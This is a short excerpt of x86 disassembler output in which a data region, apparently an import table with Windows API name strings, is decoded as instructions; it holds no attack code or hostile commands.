  423a92:	inc    ebx
  423a93:	add    BYTE PTR [ebp+0x0],dl
  423a96:	pop    edi
  423a97:	add    BYTE PTR [ecx],dh
  423a99:	add    BYTE PTR [ebp+0x0],al
  423a9c:	push   esp
  423a9d:	add    BYTE PTR [eax],dh
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [eax],al
  423aa3:	add    BYTE PTR [eax],al
  423aa5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aab:	inc    edx
  423aac:	add    BYTE PTR [eax],cl
  423aae:	add    BYTE PTR [edx+0x0],0xc
  423ab2:	add    BYTE PTR [edx+0x0],0x10
  423ab6:	add    BYTE PTR [edx+0x0],0x14
  423aba:	add    BYTE PTR [edx+0x0],0x18
  423abe:	add    BYTE PTR [edx+0x0],0x1c
  423ac2:	add    BYTE PTR [edx+0x0],0x20
  423ac6:	add    BYTE PTR [edx+0x0],0x24
  423aca:	add    BYTE PTR [edx+0x0],0x28
  423ace:	add    BYTE PTR [edx+0x0],0x0
	...
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423aea:	add    BYTE PTR [eax],al
  423aec:	adc    bh,BYTE PTR [ebx]
  423aee:	add    al,BYTE PTR [eax]
  423af0:	add    DWORD PTR [eax],eax
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    DWORD PTR [eax],eax
  423af6:	add    BYTE PTR [eax],al
  423af8:	add    DWORD PTR [eax],eax
  423afa:	add    BYTE PTR [eax],al
  423afc:	or     BYTE PTR [ebx],bh
  423afe:	add    al,BYTE PTR [eax]
  423b00:	or     al,0x3b
  423b02:	add    al,BYTE PTR [eax]
  423b04:	adc    BYTE PTR [ebx],bh
  423b06:	add    al,BYTE PTR [eax]
  423b08:	inc    esi
  423b09:	iret   
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	cmp    eax,DWORD PTR [edx]
  423b0f:	add    BYTE PTR [eax],al
  423b11:	add    BYTE PTR [edi+0x6f],dl
  423b14:	jb     0x423b7a
  423b16:	push   edi
  423b17:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b1e:	aas    
  423b1f:	inc    ebp
  423b20:	outs   dx,BYTE PTR ds:[esi]
  423b21:	jne    0x423b90
  423b23:	push   edi
  423b24:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b2b:	popa   
  423b2c:	je     0x423b97
  423b2e:	outs   dx,DWORD PTR ds:[esi]
  423b2f:	outs   dx,BYTE PTR ds:[esi]
  423b30:	jae    0x423b85
  423b32:	je     0x423b95
  423b34:	.byte 0x74
